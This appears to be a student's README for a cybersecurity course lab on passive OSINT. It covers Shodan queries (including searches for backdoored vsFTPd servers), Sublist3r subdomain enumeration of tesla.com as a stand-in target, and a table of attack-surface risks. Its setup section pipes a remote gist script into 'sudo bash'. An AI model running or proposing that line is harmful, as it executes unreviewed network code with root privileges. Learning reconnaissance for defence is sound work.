# 🕵️ W7 · S19 — The Invisible Scout: Passive OSINT Threat Profile

**Course:** Cybersecurity Operations
**Week:** 7 | **Session:** 19
**Assignment:** ThreatProfile_CloudNano.md — Portfolio Artifact Git Commit

---

## 📋 Overview

This lab simulates a **Passive Security Audit** for a fictional acquisition target called *CloudNano*. As an OSINT analyst for TitanCorp, the goal was to map the full digital footprint of the target without ever sending a single packet to their servers — leaving no trace.

All reconnaissance was performed using **publicly available tools and data only**.

---

## 🎯 Objectives

- Perform passive subdomain enumeration using **Sublist3r**
- Identify the target's technology stack using **Wappalyzer / BuiltWith**
- Check for credential exposure using **HaveIBeenPwned**
- Analyze exposed assets via **Shodan.io**
- Compile findings into a structured Threat Profile

---

## 🛠️ Tools Used

| Tool | Purpose | Type |
|---|---|---|
| [Shodan.io](https://shodan.io) | Discover internet-exposed devices and services | Web (free tier) |
| [Sublist3r](https://github.com/aboul3la/Sublist3r) | Subdomain enumeration | CLI (Kali Linux) |
| [HaveIBeenPwned](https://haveibeenpwned.com) | Credential leak / breach detection | Web |
| [BuiltWith.com](https://builtwith.com) | Technology stack fingerprinting | Web |
| [Wappalyzer](https://www.wappalyzer.com) | Browser-based tech stack detection | Browser Extension |

---

## 🔬 Lab Phases

### Phase 1 — The Shodan Pivot
Used Shodan's search filters to identify publicly exposed services:

- `city:"Allentown"` — Geographic device enumeration
- `"Remote Desktop Protocol" port:3389` — Exposed RDP endpoints
- `"vsFTPd 2.3.4" port:21` — Historically backdoored FTP servers (CVE-2011-2523)

**Key Takeaway:** Banner grabbing reveals software versions and configurations that servers leak passively to the public internet.

---

### Phase 2 — The Digital Footprint

**Target proxy used:** `tesla.com` (authorized public bug-bounty domain used as a stand-in for the fictional CloudNano target)

#### Subdomains Discovered via Sublist3r:
```
sublist3r -d tesla.com
```
- `accounts.tesla.com`
- `auth.tesla.com`
- `fleet-api.prd.na.vn.cloud.tesla.com`

#### Tech Stack (via BuiltWith.com):
- Cloudflare — CDN / DDoS protection
- React — JavaScript frontend framework

#### Credential Leak Check (via HaveIBeenPwned):
- Checked domain-associated emails for appearance in known breach databases

---

### Phase 3 — Exposure Analysis

| # | Exposure Point | Real-World Risk |
|---|---|---|
| 1 | `auth.tesla.com` visible publicly | Credential stuffing / brute-force attack surface |
| 2 | `accounts.tesla.com` exposed | IDOR or session hijacking could enable account takeover |
| 3 | `fleet-api.prd.na.vn.cloud.tesla.com` | Leaks production infrastructure naming; exposed production API risks unauthorized vehicle commands |

---

## ⚙️ Setup & Reproduction

### 1. Provision tools (run in Kali VM terminal):
```bash
curl -sL https://gist.githubusercontent.com/grobbins-cell/53c92edde076bdd0156c1810c8506cf3/raw/s19_provision.sh | sudo bash
```

### 2. Fix DNS if needed (common VM issue):
```bash
sudo chattr -i /etc/resolv.conf
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
```

### 3. Run subdomain enumeration:
```bash
sublist3r -d tesla.com
```

### 4. Fill out the Threat Profile:
```bash
nano ~/ThreatProfile_CloudNano.md
```

### 5. Submit and push:
```bash
session-submit --session 19 --artifact ~/ThreatProfile_CloudNano.md
git add ~/ThreatProfile_CloudNano.md
git commit -m "edited: W7 | S19 | OSINT Threat Profile - CloudNano"
git push
```

---

## 💡 Key Concepts Learned

- **Passive Reconnaissance** — Gathering intelligence without direct contact with the target
- **Banner Grabbing** — Reading metadata a server broadcasts publicly to identify software and versions
- **Subdomain Enumeration** — Mapping hidden infrastructure that may have weaker security than the main domain
- **Attack Surface Mapping** — Identifying all publicly visible entry points an attacker could exploit
- **OSINT (Open Source Intelligence)** — Using only public data sources for investigation

---

## ⚠️ Legal & Ethical Notice

All reconnaissance performed in this lab was:
- Conducted on **authorized targets only** (public bug-bounty domains)
- **Passive only** — no packets were sent to target servers
- Performed strictly for **educational purposes** within a controlled lab environment

> Unauthorized reconnaissance against real systems without explicit permission is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws.

---

## 📁 Artifact

- **File:** `ThreatProfile_CloudNano.md`
- **Submitted via:** `session-submit --session 19`
- **Git Commit:** `edited: W7 | S19 | OSINT Threat Profile - CloudNano`
